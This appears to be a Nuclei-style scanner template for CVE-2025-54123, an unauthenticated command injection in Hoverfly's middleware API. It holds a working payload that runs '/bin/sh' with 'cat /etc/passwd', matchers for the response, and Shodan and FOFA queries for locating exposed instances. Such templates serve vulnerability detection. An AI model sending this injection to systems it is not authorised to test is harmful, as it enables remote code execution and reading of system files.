id: CVE-2025-54123

info:
  name: Hoverfly <= 1.11.3 - Remote Code Execution
  author: nukunga[seonghyeonJeon]
  severity: critical
  description: |
    Hoverfly versions 1.11.3 and below are vulnerable to remote code execution (RCE) via command injection in the middleware API endpoint (/api/v2/hoverfly/middleware). Insufficient validation of the 'binary' and 'script' parameters allows an unauthenticated attacker to execute arbitrary commands on the host system.
  impact: |
    Attackers can execute arbitrary commands remotely, potentially leading to full system compromise with Hoverfly process privileges.
  remediation: |
    Update to a version after 1.11.3.
  reference:
    - https://github.com/advisories/GHSA-r4h8-hfp2-ggmf
    - https://nvd.nist.gov/vuln/detail/CVE-2025-54123
    - https://github.com/SpectoLabs/hoverfly/security/advisories/GHSA-r4h8-hfp2-ggmf
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2025-54123
    cwe-id: CWE-78
  metadata:
    verified: false
    max-requests: 1
    vendor: spectolabs
    product: hoverfly
    shodan-query:
      - http.favicon.hash:1357234275
      - title:"Hoverfly Dashboard"
    fofa-query:
      - icon_hash="1357234275"
      - title="Hoverfly Dashboard"
  tags: cve,cve2025,spectolabs,hoverfly,rce

requests:
  - method: PUT
    path:
      - "{{BaseURL}}/api/v2/hoverfly/middleware"
    headers:
      Content-Type: "application/json"
    body: |
      {
        "binary": "/bin/sh",
        "script": "cat /etc/passwd"
      }

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 422

      - type: regex
        part: body
        regex:
          - "root:x:0:0"
          - "STDOUT:"
        condition: and